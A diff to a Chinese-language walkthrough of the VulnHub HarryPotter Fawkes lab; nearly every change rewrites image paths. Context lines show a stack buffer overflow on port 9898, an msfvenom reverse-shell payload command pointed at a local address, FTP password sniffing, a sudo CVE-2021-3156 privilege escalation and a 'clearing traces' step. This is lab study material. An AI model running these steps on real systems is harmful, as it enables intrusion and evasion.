@@ -20,7 +20,7 @@
 
 
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\1.jpg)
+![](./pic-fawkes/1.jpg)
 
 
 
@@ -36,7 +36,7 @@
 
 使用`nmap`简单扫描一下端口
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\2.jpg)
+![](./pic-fawkes/2.jpg)
 
 可以看到两个SSH服务端口，只是使用的版本不同，还有一个`9898`端口，不知道是什么服务
 
@@ -50,19 +50,19 @@
 
 一般网站可能都是目录型，这里直接进行扫描
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\3.jpg)
+![](./pic-fawkes/3.jpg)
 
 
 
 很是罕见的什么都没有扫到，访问网站进行查看
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\4.jpg)
+![](./pic-fawkes/4.jpg)
 
 
 
 啧，电影海报啊，这里下载图片，看有无隐藏信息
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\5.jpg)
+![](./pic-fawkes/5.jpg)
 
 
 
@@ -70,7 +70,7 @@
 
 虽是接口有返回信息等，但是毫无用处
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\6.jpg)
+![](./pic-fawkes/6.jpg)
 
 
 
@@ -80,7 +80,7 @@
 
 测试使用`anonymous`匿名用户尝试登录，空密码登录成功，发现有文件，下载到`kali`
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\7.jpg)
+![](./pic-fawkes/7.jpg)
 
 
 
@@ -88,7 +88,7 @@
 
 查看文件类型，是可执行文件
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\8.jpg)
+![](./pic-fawkes/8.jpg)
 
 
 
@@ -108,11 +108,11 @@
 
 
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\9.jpg)
+![](./pic-fawkes/9.jpg)
 
 可以知道靶机上的`9898`端口的作用，应该就是启动了这个服务，为详细准确，再使用`nc`测试一遍
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\10.jpg)
+![](./pic-fawkes/10.jpg)
 
 
 
@@ -131,7 +131,7 @@ echo randomize_va_space
 
 
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\11.jpg)
+![](./pic-fawkes/11.jpg)
 
 
 
@@ -147,13 +147,13 @@ echo randomize_va_space
 
 首先把可执行文件加入到调试器中，然后选择`attch`
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\12.jpg)
+![](./pic-fawkes/12.jpg)
 
 
 
 当然这里的`attch`是通过进程进行的测试，所以需要输入关键字`server`来过滤，只要那个服务的开启。直接导入文件的话，是不需要的
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\13.jpg)
+![](./pic-fawkes/13.jpg)
 
 
 
@@ -165,7 +165,7 @@ echo randomize_va_space
 
 
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\14.jpg)
+![](./pic-fawkes/14.jpg)
 
 
 
@@ -173,7 +173,7 @@ echo randomize_va_space
 
 尝试输入很多数值字符来判断，这里最终测试400个`A`时，出现错误，地址`0x41414141`不存在
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\15.jpg)
+![](./pic-fawkes/15.jpg)
 
 
 
@@ -181,7 +181,7 @@ echo randomize_va_space
 
 可以看到，这里被覆盖了
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\16.jpg)
+![](./pic-fawkes/16.jpg)
 
 
 
@@ -199,7 +199,7 @@ echo randomize_va_space
 msf-pattern_create -l 400
 ```
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\17.jpg)
+![](./pic-fawkes/17.jpg)
 
 
 
@@ -211,7 +211,7 @@ msf-pattern_offset -l 400 -q 0x64413764
 
 
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\18.jpg)
+![](./pic-fawkes/18.jpg)
 
 
 
@@ -221,13 +221,13 @@ msf-pattern_offset -l 400 -q 0x64413764
 
 可以看到，这里的报错是`B`的十六进制
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\19.jpg)
+![](./pic-fawkes/19.jpg)
 
 
 
 从下面也可以清晰的看出`EIP`的指定内存地址，以及`ESP`的指令
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\20.jpg)
+![](./pic-fawkes/20.jpg)
 
 
 
@@ -243,13 +243,13 @@ msf-pattern_offset -l 400 -q 0x64413764
 
 
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\21.jpg)
+![](./pic-fawkes/21.jpg)
 
 
 
 选择可执行的内存地址，因为这是跳转到指令，而且如果不能执行，修改了也无作用
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\22.jpg)
+![](./pic-fawkes/22.jpg)
 
 
 
@@ -257,7 +257,7 @@ msf-pattern_offset -l 400 -q 0x64413764
 
 点击`find`，记下`jmp esp`的内存地址，`0x08049d55`
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\23.jpg)
+![](./pic-fawkes/23.jpg)
 
 
 
@@ -277,7 +277,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.16 LPORT=8888 -b "\x00" 
 
 
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\24.jpg)
+![](./pic-fawkes/24.jpg)
 
 
 
@@ -287,13 +287,13 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.16 LPORT=8888 -b "\x00" 
 
 
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\25.jpg)
+![](./pic-fawkes/25.jpg)
 
 
 
 在`payload`中加了之前并没有的`'\x90'*32`是为了防止恶意代码离的太近
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\26.jpg)
+![](./pic-fawkes/26.jpg)
 
 
 
@@ -307,7 +307,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.16 LPORT=8888 -b "\x00" 
 
 在本机上运行的服务进行而此时，成功
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\27.jpg)
+![](./pic-fawkes/27.jpg)
 
 
 
@@ -315,13 +315,13 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.16 LPORT=8888 -b "\x00" 
 
 那么修改`payload`为靶机地址和端口，然后测试
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\28.jpg)
+![](./pic-fawkes/28.jpg)
 
 
 
 反弹成功，获取一个`shell`
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\29.jpg)
+![](./pic-fawkes/29.jpg)
 
 
 
@@ -331,7 +331,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.16 LPORT=8888 -b "\x00" 
 
 最终是`/bash/sh -i`成功，在当前目录下，发现可能是密码的文本`HarrYp0tter@Hogwarts123`
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\30.jpg)
+![](./pic-fawkes/30.jpg)
 
 
 
@@ -339,7 +339,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.16 LPORT=8888 -b "\x00" 
 
 尝试使用`ssh`测试，默认端口的SSH服务连接不上，测试`2222`端口的
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\31.jpg)
+![](./pic-fawkes/31.jpg)
 
 
 
@@ -347,13 +347,13 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.16 LPORT=8888 -b "\x00" 
 
 使用`find`查找具有`SUID`权限的，有`sudo`并且可以执行任意
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\32.jpg)
+![](./pic-fawkes/32.jpg)
 
 查看后，发现`root`没有密码，直接`sudo su -`切换到`root`，然后呢，查看`root`目录下的文件
 
 
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\33.jpg)
+![](./pic-fawkes/33.jpg)
 
 
 
@@ -365,7 +365,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.16 LPORT=8888 -b "\x00" 
 
 查看网卡信息
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\35.jpg)
+![](./pic-fawkes/35.jpg)
 
 使用`tcpdump`监听
 
@@ -375,25 +375,25 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.16 LPORT=8888 -b "\x00" 
 tcpdump -i eth0 port 21
 ```
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\34.jpg)
+![](./pic-fawkes/34.jpg)
 
 
 
 使用这个用户名和密码登录，注意，这里登录的是22端口的SSH服务
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\36.jpg)
+![](./pic-fawkes/36.jpg)
 
 寻找`SUID`，发现找到`sudo`，但是不能使用
 
 
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\37.jpg)
+![](./pic-fawkes/37.jpg)
 
 收集信息
 
 
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\38.jpg)
+![](./pic-fawkes/38.jpg)
 
 使用`searchsploit`搜索，发现提权中的方法与可以使用的，不匹配
 
@@ -405,7 +405,7 @@ tcpdump -i eth0 port 21
 
 漏洞介绍`https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit`
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\39.jpg)
+![](./pic-fawkes/39.jpg)
 
 
 
@@ -417,7 +417,7 @@ tcpdump -i eth0 port 21
 
 
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\40.jpg)
+![](./pic-fawkes/40.jpg)
 
 
 
@@ -425,7 +425,7 @@ tcpdump -i eth0 port 21
 
 最终提权成功
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\41.jpg)
+![](./pic-fawkes/41.jpg)
 
 
 
@@ -435,7 +435,7 @@ tcpdump -i eth0 port 21
 
 # 清除痕迹
 
-![](D:\stu\vulnhub\harrypotter靶场\pic-fawkes\42.jpg)
+![](./pic-fawkes/42.jpg)
 
 
 
